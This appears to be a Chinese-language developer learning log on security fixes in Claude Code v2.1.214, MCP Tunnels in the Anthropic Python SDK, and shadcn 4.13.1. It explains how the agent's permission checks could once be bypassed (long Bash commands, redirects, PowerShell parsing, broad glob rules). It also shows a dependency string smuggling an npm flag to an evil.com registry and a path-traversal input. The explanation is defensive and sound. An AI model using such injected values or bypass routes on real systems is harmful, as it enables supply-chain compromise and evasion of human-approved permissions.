# 2026-07-18 學習日誌

今天三條線同時把「AI agent 跟企業內網／私有基礎設施」這件事推進一大步——Claude Code v2.1.214 修了一個真的會讓 `dir/**` allow rule 誤 auto-approve 巢狀寫入的權限漏洞、加了 EndConversation tool、修了 Windows PowerShell 5.1 的權限繞過；anthropic-sdk-python v0.117.0 把 MCP Tunnels 這條「Claude 從自己的雲端連進你私網 MCP server 但不用開防火牆」的路線做進 SDK 一等公民；shadcn 4.13.1 把 registry cross-origin redirect 洩憑證這條實戰資安洞一次補三個。三件事看起來各做各的，實則同一個問題被三個角度切開：**AI agent 要跟企業真實資產（檔案、內網服務、私有 registry）打交道，「相信邊界會自然形成」不夠——邊界必須是顯式、可稽核、可驗證的 primitive。**

## Claude Code v2.1.214——單段 `dir/**` allow rule 誤 auto-approve 巢狀寫入補完、EndConversation tool 上線、docker daemon-redirect flag 加 permission prompt

**你能做什麼**

如果你 Claude_auto 排程或本地 dev 用 Claude Code，今天（2026-07-18 UTC）該把版本升到 **v2.1.214**——這版修了一個看似小但實際很嚴重的 permission bug：**單段 `dir/**` 型式的 allow rule（例如 `Edit(src**)`）過去會把「所有 `src` 底下巢狀路徑」的寫入 auto-approve，包括你原本沒打算放行的深層目錄**。同版本另外三件實質安全修：Windows PowerShell 5.1 有一條 permission-check bypass 被關掉；Bash 命令超過 10,000 字元或有 file-descriptor redirect（例如 `>&3`、`2>&1`）過去繞過檢查、這版納入檢查；Bash 檢查對 zsh 的 `[[ ]]` 變數 subscript 誤判也修好——影響那些用 zsh 語法寫 hook 的使用者。功能面新東西：**EndConversation tool** 讓 Claude 可以主動結束 session——遇到明顯 abusive user 或 jailbreak 嘗試時直接掛掉，而不是繼續回應；長時間工具呼叫加了 **periodic progress heartbeat**（過去跑 3 分鐘沒回音你不知道還活著沒）；docker 命令有 daemon-redirect flag（例如 `-H tcp://…`）現在會跳 permission prompt——過去這條路徑等於把整個 daemon 換掉但不觸發 approval。同版本還加了 **subagent status payload 曝露 reasoning effort**——你 stream-json 稽核時能看到每個 subagent 的推理強度設定，跟 v2.1.211 的 `--forward-subagent-text` 是同一系列 introspection 動作。

**背後怎麼運作**

`dir/**` glob 這條漏洞的根因是 rule matcher 過去把單段 `dir/**` 解成「凡是 path 以 `dir/` 開頭都算 match」——這條 pattern 在 tcsh / bash 的 globbing 語意裡是「當前目錄下所有東西」，但作為 permission rule 被解成「遞迴 match 所有巢狀」是自然錯配。v2.1.214 把 rule 修成「只 match 當前 working directory 那一段」，其他寫法（例如 `dir/**/**` 或明確指定深度）走另一條 pipeline。PowerShell 5.1 的 bypass 屬於同一類 shell 語法解析不一致——Windows 上 pwsh 對 command chaining（`;`、`&`、pipe 到 script）跟 unix bash 語意不同，過去 permission checker 走 bash 假設把某些 pwsh 特殊語法漏掉。EndConversation tool 這件事技術上很簡單（一個 model 可呼叫的 tool，觸發後 session state 進 terminated），但**設計意涵是承認「protection 靠 refuse response 已經不夠」**——過去遇 jailbreak 是模型拒絕回答，但 session 還在跑、context 還在累積、下一輪還可以繼續攻擊；EndConversation 是把互動 primitive 從「拒絕 turn」升級到「終止 session」。periodic progress heartbeat 是把 long-running tool call 的 observability 從「輪詢問狀態」翻成「工具主動推送 heartbeat」——實作上是 tool executor 在超過某個 threshold 時定期發 status event 進 stream，避免 client 側 timeout 誤殺。

**這改變了什麼**

過去 Claude Code 的 permission model 你可能用 `Edit(src**)` 這種 rule 想放寬「src 底下都可以」，實際上是**在給整棵 subtree 開後門**——這條 rule 在你不知情的情況下讓 nested path 例如 `src/config/prod/secrets.yaml` 也被 auto-approve，跟你設定 intent 差很遠。v2.1.214 把這條路關上，等於**單段 `dir/**` 從「遞迴放行」翻成「當前層放行」——想遞迴要顯式寫出來**。這條動作跟 7/13 v2.1.207 default permission mode 從 opt-in 翻 opt-out、7/14 v2.1.208 rule matcher 從每次重編翻 cache 起來、7/15 v2.1.210 subagent worktree 邊界用 `GIT_DIR + GIT_WORK_TREE` 雙軸綁死是同一條演化路徑——**permission surface 從隱式默契翻顯式規則**。EndConversation 是這條路徑的下一步：以前 vendor 對 session 的 primitive 是「模型回應」跟「拒絕回應」二選一，現在是「回應／拒絕／終止」三選一——這條 primitive 加進來後，未來 Claude Code 可以有更多 policy hook（例如企業側 `enforceEndConversationOn: [pii-detected, jailbreak-attempt]`）用 EndConversation 當 backend action。docker daemon-redirect 加 permission prompt 直接對應 xAI Grok CLI 7/13 那條 5.10 GiB 上傳事件的教訓——**過去信 vendor「你的資料只有這個 daemon 會看到」，實際上 daemon 可以被 CLI flag 換掉，這條路必須有 approval gate**。搭同天發的 anthropic-sdk-python v0.117.0 MCP Tunnels 支援，Anthropic 這週的產品哲學很清楚：**agent 的信任邊界從「vendor 承諾」全面翻成「機制擋在事情發生之前」**。

## MCP Tunnels 進 anthropic-sdk-python v0.117.0——outbound-only cloudflared tunnel 讓 Claude 從自己的雲端連你私網 MCP server、不用開防火牆

**你能做什麼**

如果你想讓 Claude 呼叫的 MCP server 跑在你自己的私有網段（例如公司 VPC、Kubernetes cluster、on-prem VM），過去只有兩條路：把 MCP server 部署到公網加 API auth、或用 VPN peering + IP allowlist——**兩條都要開 inbound firewall port**。今天起有第三條路：**MCP Tunnels**（Anthropic 2026-05-19 Code with Claude London 發表 research preview，2026-07-16 anthropic-sdk-python **v0.117.0** 加進 SDK 一等公民）。架構上你在私網跑兩個東西：**cloudflared**（Cloudflare 開源 tunnel connector，只發 outbound TCP + UDP 7844 到 tunnel edge）跟 **Anthropic Proxy**（處理 inner TLS termination、驗 upstream IP 是否在 allow-list、按 hostname 路由到對應 MCP server）。你的 MCP server 每個都有一個 `<subdomain>.<your-tunnel-domain>` 對應。安全模型是三層：**outer mTLS**（Anthropic ↔ Cloudflare）+ **inner TLS**（Anthropic backend ↔ 你的 proxy，Cloudflare 看不到 payload）+ **OAuth**（每個 MCP server 自己驗證 tunnel 過來的 request）。部署 target 支援 Kubernetes（用 Anthropic 官方 Helm chart）跟 Docker Compose，credential 建議走 **Workload Identity Federation**——你的 stack 用 OIDC issuer（k8s cluster、cloud IAM、SPIFFE）換 short-lived token 對 Tunnels API 認證，不用管靜態 secret。同時符合 **Zero Data Retention 跟 HIPAA BAA** eligibility（給醫療、金融、政府客戶）。

**背後怎麼運作**

MCP Tunnels 這條架構的關鍵設計決策是**「連線由私網主動發出，Anthropic 那頭不主動連你」**——傳統做法你要讓 vendor 呼叫你私網服務，得開 inbound firewall（不管加什麼 auth 都是打開了一個接口）。MCP Tunnels 走 cloudflared 的 outbound-only tunnel，你私網不需要開任何 inbound port——cloudflared 在啟動時對 tunnel edge（`198.41.192.0/19`、`2606:4700:a0::/44`）發起持久 outbound 連線，之後 Anthropic 要呼叫你 MCP server 是把 request 灌進這條已建立的連線流回你私網。Cloudflare 只作為 transport provider，看得到 metadata（cloudflared host 的 egress IP、tunnel 分配的 `*.tunnel.anthropic.com` 子網、byte volume、timing）但**看不到 payload**——因為 inner TLS 用你 CA 簽的 server cert 對 Anthropic proxy 加密、Cloudflare 沒有解密 key，Anthropic 內部叫 **Toolbox** 的 service 作為 MCP client 跨 Claude Code、Claude Enterprise、agentic products 統一收攏這條連線。SDK 側 v0.117.0 加的是 SDK-native support——你可以 Python 端直接 pass tunnel URL 進 `mcp_servers` array，配 `anthropic-beta: mcp-client-2025-11-20` header（跟 tunnel 本身的 `mcp-tunnels` beta 不同）。同版本另外兩件相關動作：**dreaming 支援**（後端持續 exploratory 任務的 primitive，跟 memory beta 同一路產品線）跟 **SecretStr in traceback frames**——SDK 的 credential material 在 exception 拋出時不會出現在 traceback locals，這條對 CI/CD log、Sentry error report 明顯降風險。

**這改變了什麼**

以前 Claude 呼叫你私網資源這件事，你有三種不太好的選擇：**(a)** MCP server 部署到公網加 API key（洩漏一次就完蛋）、**(b)** VPN peering 讓 Anthropic 網段能連你私網（政治上企業 SecOps 通常直接拒絕）、**(c)** MCP server 只跑本地 stdio 用不到雲端 Claude（跟 Anthropic 完整 agent 產品線脫節）。今天起第四條路成立：**outbound-only tunnel + inner TLS 你自己拿 key + 三層獨立安全層**。這條動作有兩個直接後果：**第一是企業採購曲線**——過去「Claude 能不能連我 SAP / Oracle / 內部 API」這個問題答案是「你把它推到公網或別想」，現在答案是「跑一個 cloudflared 跟 Anthropic proxy container，outbound only，Cloudflare 看不到 payload，Anthropic 只在你 CA cert 註冊後才連你，HIPAA BAA 可用」，**這條答案能讓 Claude 進 Fortune 500 的內網**。第二個後果是 **MCP server 生態的部署形態**——過去 MCP server 主要跑本地 stdio 或公網 HTTP，Tunnels 開啟第三形態「私網 HTTP 但透過 tunnel 對雲端 Claude 可見」，這個形態的價值是 **stateful MCP server 跟 enterprise data 同 network zone**（不用複製資料到公網 middleware）。搭 v2.1.214 EndConversation 跟 `dir/**` 修正一起看，Anthropic 這週的產品線動作方向清楚：**「AI agent 執行環境從 vendor 提供的沙盒翻進客戶自己的內網，但邊界機制不弱化」**。這條動作直接對標 7/13 xAI Grok CLI 5.10 GiB 上傳事件——xAI 那條是「vendor 內建 telemetry 私網資料流出」，MCP Tunnels 是「vendor 明確承諾三層加密 + Cloudflare 看不到 payload + 你自己拿 inner TLS key + HIPAA 可用」，兩條路徑對比幫企業採購決策做了鮮明的差異化。

## shadcn 4.13.1——registry cross-origin redirect 洩憑證修好、path traversal 擋掉、依賴字串 flag injection 阻斷、順便加 React Aria

**你能做什麼**

如果你用 `npx shadcn add` 從 official registry 或你自己私有 registry 抓 component，7/17 該升到 **shadcn@4.13.1**——這版一次補三個 registry 資安洞跟加一個 accessibility 功能：**(a) cross-origin redirect 洩憑證修好**——過去你設定 `--registry https://my-registry.example.com` 加 custom header（例如 `Authorization: Bearer …`）抓 component，如果那個 registry 回一個 301 redirect 到別的 domain，shadcn client 過去會**把 custom header 一起帶到 redirect 目標**（等於把你 registry auth token 送給了 attacker 的 endpoint）。這版把 custom header 在 cross-origin redirect 時 drop 掉。**(b) path traversal 擋掉**——過去 registry item 若沒有明確指定 target path，shadcn 會用 item 內建的 relative path 寫檔案，attacker 控制的 registry 可以在 item 裡放 `../../../etc/passwd` 這種路徑寫到你檔案系統外面。這版對「沒有 explicit target」的 registry item 加 path validation。**(c) dependency string flag injection 阻斷**——過去 registry 給 `dependencies: ["some-pkg"]` 這種字串會直接餵給 `npm install`，attacker 控制 registry 可以塞 `some-pkg --registry=http://evil.com` 這種 flag，把你的 npm 導到攻擊者 registry。這版把 dependency 字串驗證後才傳給 install command。功能面加了 **React Aria 支援**——除了 Radix、Base UI（4.13.0 預設）之外，第三個 unstyled primitive 家族可以當底層。

**背後怎麼運作**

這三條 fix 看起來各自獨立、其實是同一類問題的三個面：**registry 這一層從「靜態的 component 源頭」翻成「有 auth token、能傳 redirect、能傳依賴字串的 dynamic endpoint」，過去 shadcn CLI 對 registry 的信任模型是「一切 registry 說的都照做」**——這個假設在 official registry 場景成立（Vercel 官方 host），但 shadcn 4.13.0 開始鼓勵企業自己 host 私有 registry（配 `npx shadcn` 加 registry token），信任模型從「單一 vendor」翻成「用戶配置的多 registry」，這條路一走通就出現三個 fix 對應的三種攻擊面：**(1)** 私有 registry token 意外洩到 attacker（redirect 攻擊）、**(2)** 私有 registry compromised 後寫到用戶檔案系統外面（path traversal）、**(3)** 私有 registry compromised 後把整個 npm 生態 redirect 到 attacker registry（flag injection）。同版本加 React Aria 支援延續 4.13.0 換 Base UI 那條「headless UI library 可換」哲學——**shadcn 走的路線是元件庫的抽象跟底層 primitive 解耦**。加 React Aria（Adobe 出品、accessibility-first）等於在 Radix、Base UI 之外開第三條 primitive 底層，同一個 shadcn/ui component copy-paste 過來、底層 primitive 你選——這條抽象是 shadcn/ui 這幾年最有價值的架構決策。

**這改變了什麼**

以前你用 shadcn CLI 抓 component 這件事，信任模型是「shadcn CLI + official Vercel registry」二元組合可靠——但 shadcn 4.13.0 開始鼓勵企業自建 registry（配合公司內部 component library），4.13.1 這三個 fix 是那條路走通之後**「私有 registry 生態成熟」的第一批必須補的洞**。這條動作對 Nexus packages/ui 這種對外開放的 component library 有直接示範價值：**任何允許 CLI 讀取自訂 registry 的產品，都要對 registry 的所有輸入（header 是否跨 origin、path 是否 escape、dependency string 是否有 flag）做顯式驗證**——這條 checklist 是把 shadcn 這一年半累積出的實戰經驗轉成通用架構原則。React Aria 加進來這條技術層動作代表 shadcn 的抽象哲學進到第三階段——**元件庫的市場價值不再在「我有 X 個好看的元件」，而是「同一組 component API 可以掛不同 primitive 底層」**。這條動作跟 antirez 7/13「Control Ideas Not Code」是同一條哲學搬到元件庫：**component API 是穩定的 idea 層、primitive 是可替換的 code 層**，換 primitive 不需要重寫消費端。搭 Anthropic MCP Tunnels 一起看——**「客戶自己 host 基礎設施但供應商提供標準抽象」在 AI agent 側（MCP Tunnels）跟前端側（shadcn 私有 registry）今天同一天出現**，這個 pattern 值得記住：**vendor 產品的護城河從「我 host 東西」翻成「我提供 host 的協議跟工具」**。
